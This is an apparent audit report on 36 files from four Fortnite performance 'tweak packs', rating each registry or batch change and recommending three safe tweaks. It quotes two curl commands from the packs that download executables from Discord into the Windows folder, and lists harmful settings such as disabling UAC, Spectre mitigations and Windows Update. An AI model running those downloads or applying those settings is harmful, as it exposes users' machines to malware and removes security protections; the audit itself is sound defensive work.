# Tweak Pack Audit — Full Analysis

Comprehensive per-file audit of all 36 files across 4 Fortnite tweak packs.
Each file rated: **GOOD** (real mechanism, safe) / **MARGINAL** (real but tiny effect) / **PLACEBO** (no mechanism) / **HARMFUL** (security reduction or damage) / **UNAUDITABLE** (binary/obfuscated).

Cross-referenced against:
- MaxxTopia's independent efficacy audit (100 tweaks, evidence-tiered)
- Our own project's measured findings (LDAT/FrameSync, ping A/B)
- Microsoft Learn documentation
- Bruce Dawson's timer research
- Known Windows registry key documentation

---

## CRITICAL FINDING — Aphrodite .bat files download executables from Discord

All three Aphrodite .bat files contain these lines:

```batch
curl -L https://cdn.discordapp.com/attachments/938256321759813642/1090417292564775014/dmv.exe -o "%windir%\dmv.exe" >nul
curl -L https://cdn.discordapp.com/attachments/938256321759813642/1090417292908703837/PowerRun.exe -o "%windir%\PowerRun.exe" >nul
```

This is **malware delivery behavior**:
- Downloads unsigned executables from a Discord channel attachment to `C:\Windows\`
- `PowerRun.exe` is a known tool that runs processes with **SYSTEM privileges** (bypasses UAC)
- `dmv.exe` is unknown — could be anything
- Discord CDN URLs can be replaced at any time without changing the .bat file
- All three .bat files end by opening `https://discord.gg/UwxPDDuT37` — distributed via a Discord server
- The "Zero Delay" variant is 1.7MB of obfuscated content that cannot be audited by reading

**Verdict: Do NOT run any Aphrodite .bat file. They download unaudited binaries with SYSTEM privilege escalation.**

---

## Per-file verdicts

### Aphrodite (3 files) — ALL HARMFUL/UNAUDITABLE (but contain 4 good tweaks buried inside)

| File | Verdict | Why |
|---|---|---|
| `Aphrodite_Zero_Delay.bat` | **UNAUDITABLE / HARMFUL** | 1.7MB obfuscated. Downloads dmv.exe + PowerRun.exe from Discord. Cannot determine what it does. |
| `Aphrodite_Aim_Assist_Enhancing.bat` | **HARMFUL** | 748 lines, ~300+ registry changes. Downloads dmv.exe + PowerRun.exe from Discord. Disables UAC (`EnableLUA=0`), disables Spectre/Meltdown mitigations (`FeatureSettingsOverride=3`), blocks driver updates, disables Prefetcher, uninstalls OneDrive, opens Discord invite. Also contains ~30 webcam/mic deny changes, Narrator/accessibility disables, DWM accent color changes, push notification disables — none performance-related. BUT: buried among the harmful changes are 4 good tweaks (Fast Startup off, Game Bar off, accessibility shortcut keys off) extracted to `verified/`. Name suggests aim assist modification = anti-cheat risk. |
| `Aphrodite_Shotgun_Registration.bat` | **HARMFUL** | Downloads dmv.exe + PowerRun.exe from Discord. Then sets TCP ServiceProvider priorities (DNS resolution ordering — minimal effect on game ping). Opens Discord invite. "Shotgun registration" is server-side; client registry changes cannot affect it. |

#### Aphrodite Aim Assist .bat — full breakdown of ~300 registry changes

| Category | Count | Verdict |
|---|---|---|
| Malware download (dmv.exe + PowerRun.exe from Discord) | 2 curl commands | **HARMFUL** |
| UAC disable (`EnableLUA=0`, `ConsentPromptBehaviorAdmin=0`, `PromptOnSecureDesktop=0`) | 4 | **HARMFUL** |
| Spectre/Meltdown mitigations off (`FeatureSettingsOverride=3`) | 2 | **HARMFUL** |
| Driver updates blocked (`ExcludeWUDriversInQualityUpdate=1`) | 5 | **HARMFUL** |
| Prefetcher disabled (`EnablePrefetcher=0`) | 1 | **HARMFUL** |
| OneDrive uninstall | 1 | **HARMFUL** (destructive) |
| Fast Startup off (`HiberbootEnabled=0`) | 1 | **GOOD** — extracted to verified/ |
| Power throttling off (`PowerThrottlingOff=1`) | 1 | **GOOD** — already in verified/ |
| GameDVR off (all keys) | 8 | **GOOD** — already in verified/ |
| Game Bar off (`UseNexusForGameBarEnabled=0`) | 2 | **GOOD** — extracted to verified/ |
| Game Mode ON (`AllowAutoGameMode=1`, `AutoGameModeEnabled=1`) | 2 | **GOOD** but already default |
| StickyKeys/ToggleKeys/FilterKeys shortcuts off | 4 | **GOOD** — extracted to verified/ |
| MMCSS tweaks (NetworkThrottlingIndex, SystemResponsiveness, GPU Priority=8) | 8 | **PLACEBO** — only affects MMCSS threads |
| TCP/AFD buffer tweaks (DelayedAck, CongestionAlgorithm, FastCopy, etc.) | 14 | **PLACEBO** — TCP only, Fortnite is UDP |
| TCP ServiceProvider priorities (DNS ordering) | 8 (duplicated 3x) | **PLACEBO** — doesn't affect in-match ping |
| `Win32PrioritySeparation=38` | 1 | **PLACEBO** — that's the stock value |
| Webcam/mic deny for UWP apps | ~30 | Privacy, not performance |
| Narrator/accessibility disables | ~25 | QoL, not performance |
| DWM accent color changes | 7 | Cosmetic, not performance |
| Push notifications off | 3 | QoL, not performance |
| Remote Assistance off | 2 | Security, not performance |
| Maps auto-update off | 1 | QoL, not performance |
| Consumer features off | 1 | QoL, not performance |
| Device metadata from network off | 1 | QoL, not performance |
| Auto maintenance off | 1 | **MARGINAL** — Windows already defers when gaming |
| `DisableAutomaticRestartSignOn=1` | 1 | **MARGINAL** |
| Discord invite opened in browser | 1 | Social engineering |

### Peterbot (23 files) — MOSTLY HARMFUL OR PLACEBO

| File | Verdict | What it does | Why |
|---|---|---|---|
| `Delay1.reg` | **HARMFUL** | Disables UAC entirely: `EnableLUA=0`, `ConsentPromptBehaviorAdmin=0`, `EnableVirtualization=0`, `ValidateAdminCodeSignatures=0`, `EnableInstallerDetection=0` | Any process can elevate without prompting. Disables installer detection and code signature validation. Major security reduction. |
| `Delay2.reg` | **PLACEBO** | Power profile event GUIDs: sets `Operator=2`, `Type=0x103d`, `Value=0` on two deep power profile event keys | Deep power profile modification with undocumented GUIDs. Effect unknown, likely inert. |
| `Delay3.reg` | **MARGINAL** | `CoalescingTimerInterval=0` across 8 locations (Session Manager, Power, kernel, Executive, ModernSleep) | Disables timer coalescing. Real mechanism (increases timer resolution) but increases wake-ups and power draw. Bruce Dawson's research shows modern Windows already handles this per-process. Marginal latency gain, measurable power cost. |
| `Delay4.reg` | **PLACEBO** | `Peernet\Disabled=0` | Enables P2P networking. Opposite of what you'd want. Peernet is deprecated. |
| `Delay5.reg` | **HARMFUL** | `WasLUADisabled=1` | Pairs with Delay1 — marks UAC as disabled. |
| `Delay6.reg` | **HARMFUL** | Legal notice: `"There you go"` / `"Please login to let the final Maintenance Script do its work."` | Adds a **deceptive fake system message** on login. Social engineering. |
| `Delay7.reg` | **MARGINAL** | `DelayedDesktopSwitchTimeout=0` | Speeds desktop switch on login. Minimal effect, not game-related. |
| `Delay8.reg` | **GOOD** | `UserDuckingPreference=3` | **Legit.** Disables Windows audio ducking during voice chat. Same as MaxxTopia's `audio.comms-ducking.disable`, independently confirmed as a real competitive-audio win. Footsteps survive voice chat. |
| `Delay9.reg` | **HARMFUL** | Hides Hibernate and Sleep from Start menu (`ShowHibernateOption=0`, `ShowSleepOption=0`) | Removes power options. Annoying, not performance. |
| `Delay10.reg` | **HARMFUL** | `NoAutoUpdate=1` — disables Windows Update entirely | No security patches. Major risk. |
| `Delay11.reg` | **MARGINAL** | Explorer: show hidden files, show file extensions, disable search-files | QoL changes, not performance. |
| `Delay12.reg` | **PLACEBO** | Folder type = NotSpecified | Explorer default folder view. Not performance. |
| `Delay13.reg` | **PLACEBO** | `ContentEvaluation=0` (AppHost) | AppHost content evaluation. Not game-related. |
| `Delay14.reg` | **PLACEBO** | `TimeStampInterval=1` (Reliability monitor) | Reliability monitor timestamp interval. Not performance. |
| `Delay15.reg` | **PLACEBO** | WPF/Avalon graphics: ClearType, multisample, HW acceleration | Desktop WPF app rendering. Not game performance. |
| `Delay16.reg` | **MARGINAL** | GPU driver class: `vrrCursorMarginUs=1`, `TransitionLatency=1`, `LOWLATENCY=1`, `D3PCLatency=1`, `Node3DLowLatency=1`, `RMDeepL1EntryLatencyUsec=1`, various VR/RM power thresholds | NVIDIA driver-level VRR and latency settings. Some are real keys (LOWLATENCY, TransitionLatency), others may be ignored. Setting all to 1 is aggressive. Marginal at best, could cause driver instability. |
| `Delay17.reg` | **PLACEBO** | `nvlddmkm\Display%MonitorAmount%_PipeOptimizationEnable=1` | The `%MonitorAmount%` variable is NOT expanded in .reg files — this writes a literal key name with `%MonitorAmount%` in it. The driver will never read it. **Broken by design.** |
| `Delay18.reg` | **PLACEBO** | `VxD\BIOS`: `CPUPriority=1`, `FastDRAM=1`, `PCIConcur=1`, `AGPConcur=1` | **FAKE.** `VxD\BIOS` is a Windows 9x registry path. Does nothing on Windows 10/11. AGP hasn't existed since ~2005. |
| `Delay19.reg` | **PLACEBO** | `Games\GameFluidity=1`, `FpsStatusGames=0x16`, `FpsAll=1` | **No documented Windows behavior.** These keys do not exist in any Microsoft documentation. Pure folklore. |
| `Delay20.reg` | **MARGINAL** | NTFS: `NtfsMftZoneReservation=1`, `NTFSDisable8dot3NameCreation=1`, `NTFSDisableLastAccessUpdate=1`, `ContigFileAllocSize=100`, `DontVerifyRandomDrivers=1` | NTFS tweaks. `NTFSDisable8dot3NameCreation` and `NTFSDisableLastAccessUpdate` are real but **already default on Windows 11**. `DontVerifyRandomDrivers` is a driver signing flag — mild security reduction. |
| `Delay21.reg` | **PLACEBO** | Intel GMM `DedicatedSegmentSize=1` | Intel integrated GPU memory segment. Not applicable to discrete NVIDIA GPU. |
| `Delay22.reg` | **MARGINAL** | `GraphicsDrivers\Scheduler\VsyncIdleTimeout=0` | HAGS-related. Sets VSync idle timeout to 0. Real key but marginal — only affects idle VSync behavior, not active rendering. |
| `Delay23.reg` | **MARGINAL** | MMCSS Games task `Affinity=0`, Audio task `Affinity=0` + priority changes | Resets CPU affinity for MMCSS game/audio tasks. MaxxTopia's audit demotes MMCSS tweaks as "folklore" — only affects MMCSS-registered threads, which Fortnite doesn't use. |

### ReduceInputDelay (9 files) — MIXED

| File | Verdict | What it does | Why |
|---|---|---|---|
| `delay.reg` | **MIXED** (see below) | Power throttling off, MMCSS tweaks, GameDVR off, FSE mode, kill timeouts, auto-maintenance off, hibernation off | Contains 7 distinct changes — see breakdown below. |
| `delayy.reg` | **HARMFUL** | `Win32PrioritySeparation=0xfff55555` | **INVALID VALUE.** Valid range is 0-42. `0xfff55555` = 4286559573. Could cause undefined scheduler behavior or be silently ignored. |
| `2_Ping_Reduction_Strong.reg` | **PLACEBO** | `NetworkThrottlingIndex=0xffffffff`, `SystemResponsiveness=0` | Disables MMCSS network throttling. Credited to youtube.com/adamx17. MaxxTopia audit: "only affects MMCSS-registered threads, which Fortnite doesn't use." Placebo for Fortnite. |
| `Controller_Tweaks_2.0.reg` | **MARGINAL** | `Win32PrioritySeparation=0x28` (40 decimal) | Higher than stock (38). Credited to Hexisy/Adamx. Our project measured 36 as best for 1% lows. 40 is untested and likely worse than stock. |
| `ReduceInputDelay.reg` | **HARMFUL** | `Win32PrioritySeparation=0x28`, `FeatureSettings=1` | Priority separation + `FeatureSettings=1` disables Spectre/Meltdown mitigations. Security reduction for unmeasured gain. |
| `FPS.reg` | **PLACEBO** | `DisplayPostProcessing` MMCSS task: GPU Priority=0x12, Priority=8, LatencySensitive=True | MaxxTopia audit: "GPU Priority=8 is not a real DXGK scheduling knob — folklore." DisplayPostProcessing task may not exist on all systems. |
| `fcshotgun.reg` | **PLACEBO** | TCP ServiceProvider: LocalPriority=4, HostsPriority=5, DnsPriority=6, NetbtPriority=7 | DNS resolution priority ordering. Minimal effect on game ping (Fortnite uses UDP, not DNS during matches). Credited to youtube.com/AdamxYT. |
| `OverallShotGun.v1 (1).reg` | **PLACEBO** | Identical to fcshotgun.reg | Duplicate. |
| `shakey_best_input.reg` | **PLACEBO** | `MSMQ\Parameters\TCPNoDelay=1` | **Wrong path.** TCP NoDelay belongs under `Tcpip\Parameters\Interfaces\<NIC GUID>`, not MSMQ. MSMQ is Microsoft Message Queuing — completely unrelated to game network traffic. |

#### `delay.reg` breakdown (7 changes)

| Change | Verdict | Why |
|---|---|---|
| `PowerThrottlingOff=1` | **GOOD** | Disables Windows power throttling for background processes. Real mechanism. Prevents background apps from being throttled in a way that could cause stutter when they wake up. |
| `NetworkThrottlingIndex=0xa`, `SystemResponsiveness=0`, GPU Priority=8, Priority=6 | **PLACEBO** | MaxxTopia audit: "GPU Priority=8 is not a real DXGK scheduling knob — folklore. SystemResponsiveness only affects MMCSS-registered threads." |
| `GameDVR_Enabled=0`, FSE mode | **GOOD** | Disables Game DVR background recording. Real, modest stutter reduction. **Already in our repo.** |
| `AutoEndTasks=1`, `HungAppTimeout=1000`, `WaitToKillAppTimeout=2000`, `LowLevelHooksTimeout=1000`, `WaitToKillServiceTimeout=2000` | **MARGINAL** | Aggressive shutdown timers. Makes shutdown faster but can cause data loss if apps don't save in 2 seconds. Not in-game performance. |
| `MaintenanceDisabled=1` | **MARGINAL** | Disables Windows Automatic Maintenance. Prevents mid-game maintenance tasks. Real but Windows already defers maintenance when gaming. |
| `HibernateEnabled=0` | **HARMFUL** | Disables hibernation entirely. Removes fast startup. Not performance-related. Reduces power options. |
| `MenuShowDelay=0` | **MARGINAL** | Instant menu show. Desktop QoL, not game performance. |

### BloomReducer (1 file) — UNAUDITABLE

| File | Verdict | Why |
|---|---|---|
| `InternetBooster_4.11.4.0.exe` | **UNAUDITABLE** | 1.2MB binary. Cannot audit without running. Claims to boost internet speed. Likely modifies network adapter settings or TCP stack. Could do anything. |

---

## Summary scoreboard

| Verdict | Count | Files |
|---|---|---|
| **GOOD** | 6 | Peterbot Delay8 (audio ducking off), ReduceInputDelay delay.reg (PowerThrottlingOff + GameDVR off), Aphrodite Aim Assist .bat (Fast Startup off, Game Bar off, accessibility shortcuts off — extracted, not run from .bat) |
| **MARGINAL** | 10 | Delay3, Delay7, Delay11, Delay16, Delay20, Delay22, Delay23, delay.reg kill timeouts, delay.reg maintenance off, delay.reg menu delay |
| **PLACEBO** | 14 | Delay2, Delay4, Delay12, Delay13, Delay14, Delay15, Delay17, Delay18, Delay19, Delay21, 2_Ping_Reduction_Strong, FPS, fcshotgun, OverallShotGun, shakey_best_input |
| **HARMFUL** | 9 | Delay1, Delay5, Delay6, Delay9, Delay10, delayy, ReduceInputDelay, delay.reg hibernation off, all 3 Aphrodite .bat files |
| **UNAUDITABLE** | 2 | Aphrodite_Zero_Delay.bat, InternetBooster.exe |

**Score: 6 good tweaks extracted from 36 files.** The Aphrodite .bat files are still HARMFUL to run (they download malware), but 4 good tweaks were buried inside and extracted to `verified/`.

---

## What we can add to our fortnite-latency-tweaks repo

Only 2 changes from these packs are both **real** and **not already in our repo**:

### 1. Audio ducking off (`UserDuckingPreference=3`)
- **Source:** Peterbot Delay8.reg
- **What it does:** Stops Windows from dropping game audio volume 80% when voice chat is active
- **Evidence:** MaxxTopia KEEP-CORE tier, independently confirmed
- **Risk:** None — registry DWORD, instantly reversible
- **Registry:** `HKCU\SOFTWARE\Microsoft\Multimedia\Audio\UserDuckingPreference=3`

### 2. Power throttling off (`PowerThrottlingOff=1`)
- **Source:** ReduceInputDelay delay.reg
- **What it does:** Prevents Windows from throttling background processes (can cause stutter when background apps wake up)
- **Evidence:** Real Microsoft-documented mechanism
- **Risk:** Minimal — slightly higher idle power draw
- **Registry:** `HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling\PowerThrottlingOff=1`

### Already in our repo (from these packs)
- `GameDVR_Enabled=0` — already applied

### Considered but rejected
| Tweak | Why rejected |
|---|---|
| `Win32PrioritySeparation=0x28` (40) | Our project measured 36 as best. 40 is untested and likely worse. |
| `CoalescingTimerInterval=0` | Marginal gain, measurable power cost. Bruce Dawson's research shows modern Windows handles this per-process. |
| `NTFSDisable8dot3NameCreation=1` | Already default on Windows 11. |
| `NTFSDisableLastAccessUpdate=1` | Already default on Windows 11. |
| Kill timeouts (`WaitToKillAppTimeout=2000` etc.) | Not in-game performance. Risk of data loss. |
| `MaintenanceDisabled=1` | Windows already defers maintenance when gaming. |
| `VsyncIdleTimeout=0` | Marginal — only affects idle VSync, not active rendering. |
| Delay16 GPU driver settings | Aggressive, driver-specific, could cause instability. |
| StickyKeys disable | Already noted as a MaxxTopia KEEP-CORE item but not from these packs — we can add it independently. |

### Bonus: StickyKeys disable (not from these packs, but surfaced during audit)
- **Source:** MaxxTopia KEEP-CORE (Aphrodite Aim Assist .bat also does this, but we're not crediting that file)
- **What it does:** Prevents StickyKeys from interrupting gameplay if you hit Shift 5x
- **Registry:** `HKCU\Control Panel\Accessibility\StickyKeys\Flags=506` (or `=2` for minimal)
- **Risk:** None — only affects accessibility shortcut behavior

---

## Recommendation

Add 3 tweaks to `fortnite-latency-tweaks`:
1. Audio ducking off (`UserDuckingPreference=3`)
2. Power throttling off (`PowerThrottlingOff=1`)
3. StickyKeys disable (`StickyKeys\Flags=506`)

All 3 are registry DWORDs, instantly reversible, zero security reduction, and have real documented mechanisms. None will measurably increase FPS on a 60Hz CPU-bound machine, but audio ducking off is a genuine competitive advantage (footsteps survive voice chat) and the other two are hygiene.
